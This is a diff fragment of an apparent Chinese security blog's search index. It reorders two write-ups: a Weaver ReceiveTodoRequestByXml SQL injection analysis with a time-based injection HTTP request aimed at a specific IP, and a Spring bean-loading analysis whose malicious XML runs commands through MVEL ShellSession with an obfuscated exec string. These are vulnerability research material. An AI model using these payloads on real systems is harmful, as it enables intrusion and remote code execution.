                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934603460-058cf085-1437-4298-90e0-6a62de1a8df6.png"
-                      class=""
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004836973.png"
+                      class="" title="image-20250315004836973"
                 > 
 
-<p>看下面的函数调用</p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为我们会用到这个类MethodInvokingFactoryBean.class，我们给他所有方法打上断点，毕竟不知道哪里会给断下来</p>
+<p>想要分析细节一点，所以我们得往上找调用栈</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934626851-89128d09-b5f9-403b-b054-379fde6cf32f.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315002937211.png"
+                      class="" title="image-20250315002937211"
                 > 
 
-<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
-<p>看processDoneRequestByMap</p>
-<img  
+<p>bean是我们的MethodInvokingFactoryBean.，调用了他的afterPropertiesSet的方法</p>
+<p>afterPropertiesSet()</p>
+<h4 id="this-prepare"><a href="#this-prepare" class="headerlink" title="this.prepare()"></a>this.prepare()</h4><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934718200-434fd29d-682f-400b-93f2-ce209d226183.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003012237.png"
+                      class="" title="image-20250315003012237"
                 > 
 
-<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
+<p>看下这个prepare干了什么</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934776768-04bf85e2-8063-4b08-8e4a-84327a7319c2.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003210313.png"
+                      class="" title="image-20250315003210313"
+                >  
+
+<p>看他获取了我们xml文件里面的targetClass，targetMethod，arguments存着参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003714215.png"
+                      class="" title="image-20250315003714215"
                 > 
 
-<p>看下这个ofsTodoDataManager</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934849472-815d2e8a-e10b-4d64-8683-d6bbb091d2ab.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003616973.png"
+                      class="" title="image-20250315003616973"
                 > 
 
-<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
-<p>如果能让他初始化为自己</p>
-<img  
+<p>利用反射去获取了方法</p>
+<h4 id="this-invokeWithTargetException"><a href="#this-invokeWithTargetException" class="headerlink" title="this.invokeWithTargetException()"></a>this.invokeWithTargetException()</h4><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934925778-c591ef48-a95c-4965-95a6-09d11a663cd4.png"
-                      class="" title="img"
-                >
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004053199.png"
+                      class="" title="image-20250315004053199"
+                >  
 
-<p>调用的就是当前这个类的validate</p>
+<p>这个函数里面又调用了invoke</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934973254-016eea77-8bed-4cd8-8d60-f4f340bc9b08.png"
-                      class="" title="img"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003906114.png"
+                      class="" title="image-20250315003906114"
                 > 
 
-<p>这个service是个数据库函数操作</p>
+<p>这里最后利用反射造成命令执行</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935007147-b7ab5a30-39ad-4c2e-a7f2-bcc9b9c2a876.png"
-                      class="" title="img"
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935040637-07f6f16f-3e67-4e5a-9571-51eeafcb43f5.png"
-                      class="" title="img"
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935059257-61993553-1a52-4170-a00a-d5e0c71a6419.png"
-                      class="" title="img"
-                >
-
-<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935083565-14ce57bb-a5db-49b7-bcf7-6ae12b621531.png"
-                      class="" title="img"
-                >
-
-<p>直接拼接，所以大概率存在SQL注入</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250313195111266.png"
-                      class="" title="image-20250313195111266"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004140424.png"
+                      class="" title="image-20250315004140424"
                 > 
 
-<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
+<p>后续就是MVEL利用ShellSession的exec方法传入恶意String字符串造成命令执行。</p>
+<h2 id="恶意xml文件分析"><a href="#恶意xml文件分析" class="headerlink" title="恶意xml文件分析"></a>恶意xml文件分析</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004352831.png"
+                      class="" title="image-20250315004352831"
+                > 
+
+<p>利用spring底层这个类，它会实例化我们的targetObject类，然后利用反射去执行targetMethod方法</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004447540.png"
+                      class="" title="image-20250315004447540"
+                > 
+
+
+
+
+
+
+
+
+
+
+
 ]]></content>
       <categories>
-        <category>代码审计</category>
+        <category>漏洞原理分析</category>
       </categories>
-      <tags>
-        <tag>泛微</tag>
-      </tags>
   </entry>
   <entry>
     <title>Log4j漏洞分析</title>
@@ -1675,150 +2238,121 @@
       </tags>
   </entry>
   <entry>
-    <title>spring框架bean加载漏洞</title>
-    <url>/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>在Spring框架中，<strong>Bean</strong> 是一个非常重要的概念，它是Spring框架的核心组件之一。以下是对Bean的详细解释：</p>
-<h3 id="1-Bean的定义"><a href="#1-Bean的定义" class="headerlink" title="1. Bean的定义"></a>1. Bean的定义</h3><p>Bean是Spring框架中被管理的对象，通常是一个普通的Java类（POJO，Plain Old Java Object）。Spring通过依赖注入（DI）和控制反转（IoC）的机制来管理这些对象的生命周期、依赖关系和配置信息。</p>
-<h3 id="2-Bean的作用"><a href="#2-Bean的作用" class="headerlink" title="2. Bean的作用"></a>2. Bean的作用</h3><p>Bean在Spring框架中扮演着多种角色：</p>
-<ul>
-<li><strong>业务逻辑实现</strong>：Bean可以是实现具体业务逻辑的类，例如Service层的类，负责处理业务流程。</li>
-<li><strong>数据访问</strong>：Bean可以是数据访问层的类，例如DAO（Data Access Object）类，用于与数据库进行交互。</li>
-<li><strong>配置管理</strong>：Bean可以是配置类，用于定义应用程序的配置信息。</li>
-<li><strong>工具类</strong>：Bean也可以是工具类，提供一些通用的功能，例如日志记录、文件操作等。</li>
-</ul>
-<h3 id="3-Bean的生命周期"><a href="#3-Bean的生命周期" class="headerlink" title="3. Bean的生命周期"></a>3. Bean的生命周期</h3><p>Spring框架对Bean的生命周期进行了严格的管理，主要包括以下几个阶段：</p>
-<ul>
-<li><strong>实例化</strong>：Spring容器根据配置信息创建Bean的实例。</li>
-<li><strong>属性赋值</strong>：Spring容器将配置文件中定义的属性值注入到Bean实例中。</li>
-<li><strong>初始化</strong>：如果Bean实现了<code>InitializingBean</code>接口或定义了<code>init-method</code>，Spring容器会调用初始化方法。</li>
-<li><strong>使用</strong>：Bean实例被应用程序使用，执行业务逻辑。</li>
-<li><strong>销毁</strong>：当Spring容器关闭时，如果Bean实现了<code>DisposableBean</code>接口或定义了<code>destroy-method</code>，Spring容器会调用销毁方法。</li>
-</ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>高版本的Spring框架需要<strong>JDK17</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt; &lt;!-- 替换为你的目标版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;6.1.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
+    <title>泛微ReceiveTodoRequestByXml_SQL注入漏洞</title>
+    <url>/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h2 id="接口跟踪分析"><a href="#接口跟踪分析" class="headerlink" title="接口跟踪分析"></a>接口跟踪分析</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934498866-18a10609-e8e2-4300-8f28-0e040d94a1a0.png"
+                      class="" title="img"
+                > 
 
-<p>一般spring系统都会带有相关的依赖可以支持我们通过xml文件去加载bean，依赖不一定是上面这个</p>
-<p><strong>能shell的类</strong> </p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.4.4.Final&lt;/version&gt; &lt;!-- 你可以根据需要选择其他版本 --&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里我选择MVEL，我前面文章也有写MVEL依赖如何实现命令执行，他有多种方式可以实现</p>
-<p>参考链接 <a href="https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/">https://ro0ki1.github.io/2025/03/13/MVEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/</a> </p>
-<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.springframework.context.ApplicationContext;</span><br><span class="line">import org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line">public class Bean_test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ApplicationContext context = new ClassPathXmlApplicationContext(&quot;test.xml&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="漏洞xml配置文件"><a href="#漏洞xml配置文件" class="headerlink" title="漏洞xml配置文件"></a>漏洞xml配置文件</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;jndi&quot; class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot; init-method=&quot;getObject&quot;&gt;</span><br><span class="line">        &lt;property name=&quot;targetObject&quot;&gt;</span><br><span class="line">            &lt;bean class=&quot;org.mvel2.sh.ShellSession&quot;/&gt;</span><br><span class="line">        &lt;/property&gt;</span><br><span class="line">        &lt;property name=&quot;targetMethod&quot; value=&quot;exec&quot;/&gt;</span><br><span class="line">        &lt;property name=&quot;arguments&quot;</span><br><span class="line">                  value=&quot;push Runtime.getRuntime().exec(String.valueOf((char)111)+String.valueOf((char)112)+String.valueOf((char)101)+String.valueOf((char)110)+String.valueOf((char)32)+String.valueOf((char)45)+String.valueOf((char)97)+String.valueOf((char)32)+String.valueOf((char)67)+String.valueOf((char)97)+String.valueOf((char)108)+String.valueOf((char)99)+String.valueOf((char)117)+String.valueOf((char)108)+String.valueOf((char)97)+String.valueOf((char)116)+String.valueOf((char)111)+String.valueOf((char)114));&quot;/&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>这里先初步说一下重点。还没链子明白了再细说一下恶意文件怎么改</p>
+<p>实例化函数没东西</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315000112008.png"
-                      class="" title="image-20250315000112008"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934603460-058cf085-1437-4298-90e0-6a62de1a8df6.png"
+                      class=""
                 > 
 
-<p>样例测试</p>
-<p>可以注意一下目录结构，加载文件是加载resources这个目录下的</p>
+<p>看下面的函数调用</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004836973.png"
-                      class="" title="image-20250315004836973"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934626851-89128d09-b5f9-403b-b054-379fde6cf32f.png"
+                      class="" title="img"
                 > 
 
-<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>因为我们会用到这个类MethodInvokingFactoryBean.class，我们给他所有方法打上断点，毕竟不知道哪里会给断下来</p>
-<p>想要分析细节一点，所以我们得往上找调用栈</p>
+<p>现在的步骤是<br>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap</p>
+<p>看processDoneRequestByMap</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315002937211.png"
-                      class="" title="image-20250315002937211"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934718200-434fd29d-682f-400b-93f2-ce209d226183.png"
+                      class="" title="img"
                 > 
 
-<p>bean是我们的MethodInvokingFactoryBean.，调用了他的afterPropertiesSet的方法</p>
-<p>afterPropertiesSet()</p>
-<h4 id="this-prepare"><a href="#this-prepare" class="headerlink" title="this.prepare()"></a>this.prepare()</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003012237.png"
-                      class="" title="image-20250315003012237"
-                > 
-
-<p>看下这个prepare干了什么</p>
+<p>实例化-&gt;processDoneRequestByXml-&gt;processDoneRequestByMap-&gt;receiveRequestInfo</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003210313.png"
-                      class="" title="image-20250315003210313"
-                >  
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934776768-04bf85e2-8063-4b08-8e4a-84327a7319c2.png"
+                      class="" title="img"
+                > 
 
-<p>看他获取了我们xml文件里面的targetClass，targetMethod，arguments存着参数</p>
+<p>看下这个ofsTodoDataManager</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003714215.png"
-                      class="" title="image-20250315003714215"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934849472-815d2e8a-e10b-4d64-8683-d6bbb091d2ab.png"
+                      class="" title="img"
                 > 
+
+<p>初始为null，看到设置的地方让他为this，看他的类型是OfsTodoDataManagerNew继承的</p>
+<p>如果能让他初始化为自己</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934925778-c591ef48-a95c-4965-95a6-09d11a663cd4.png"
+                      class="" title="img"
+                >
+
+<p>调用的就是当前这个类的validate</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738934973254-016eea77-8bed-4cd8-8d60-f4f340bc9b08.png"
+                      class="" title="img"
+                > 
+
+<p>这个service是个数据库函数操作</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935007147-b7ab5a30-39ad-4c2e-a7f2-bcc9b9c2a876.png"
+                      class="" title="img"
+                >
 
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003616973.png"
-                      class="" title="image-20250315003616973"
-                > 
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935040637-07f6f16f-3e67-4e5a-9571-51eeafcb43f5.png"
+                      class="" title="img"
+                >
 
-<p>利用反射去获取了方法</p>
-<h4 id="this-invokeWithTargetException"><a href="#this-invokeWithTargetException" class="headerlink" title="this.invokeWithTargetException()"></a>this.invokeWithTargetException()</h4><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004053199.png"
-                      class="" title="image-20250315004053199"
-                >  
-
-<p>这个函数里面又调用了invoke</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315003906114.png"
-                      class="" title="image-20250315003906114"
-                > 
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935059257-61993553-1a52-4170-a00a-d5e0c71a6419.png"
+                      class="" title="img"
+                >
 
-<p>这里最后利用反射造成命令执行</p>
+<p>看到传入的string被处理了一下执行，看下怎么被处理的</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004140424.png"
-                      class="" title="image-20250315004140424"
-                > 
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1738935083565-14ce57bb-a5db-49b7-bcf7-6ae12b621531.png"
+                      class="" title="img"
+                >
 
-<p>后续就是MVEL利用ShellSession的exec方法传入恶意String字符串造成命令执行。</p>
-<h2 id="恶意xml文件分析"><a href="#恶意xml文件分析" class="headerlink" title="恶意xml文件分析"></a>恶意xml文件分析</h2><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004352831.png"
-                      class="" title="image-20250315004352831"
-                > 
+<p>直接拼接，所以大概率存在SQL注入</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /rest/ofs/ProcessDoneRequestByXml HTTP/1.1</span><br><span class="line">Host: 110.41.14.179:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://110.41.14.179:81/wui/index.html</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: ecology_JSessionid=aaaEApas7tMMlgz3yzdtz; JSESSIONID=aaaEApas7tMMlgz3yzdtz; __randcode__=e1f89faf-ccd6-4d92-aeff-5fb0251b0600</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&lt;request&gt;</span><br><span class="line">        &lt;syscode&gt;1&#x27;||(SELECT 0x6b4f7252 FROM DUAL WHERE 6182=6182 AND (SELECT 8607 FROM (SELECT(SLEEP(5)))LPaW))||&#x27;&lt;/syscode&gt;</span><br><span class="line">&lt;/request&gt;</span><br></pre></td></tr></table></figure></div>
 
-<p>利用spring底层这个类，它会实例化我们的targetObject类，然后利用反射去执行targetMethod方法</p>
 <img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/2025/03/15/spring%E6%A1%86%E6%9E%B6bean%E5%8A%A0%E8%BD%BD%E6%BC%8F%E6%B4%9E/image-20250315004447540.png"
-                      class="" title="image-20250315004447540"
+                     data-src="/2025/03/13/%E6%B3%9B%E5%BE%AEReceiveTodoRequestByXml-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250313195111266.png"
+                      class="" title="image-20250313195111266"
                 > 
 
-
-
-
-
-
-
-
-
-
-
+<p>存在mysql数据库的延时注入。sqlserver没打成功</p>
 ]]></content>
       <categories>
-        <category>漏洞原理分析</category>
+        <category>代码审计</category>
       </categories>
+      <tags>
+        <tag>泛微</tag>
+      </tags>
   </entry>
   <entry>
     <title>泛微deleteRequestInfoByXml接口xml注入漏洞</title>
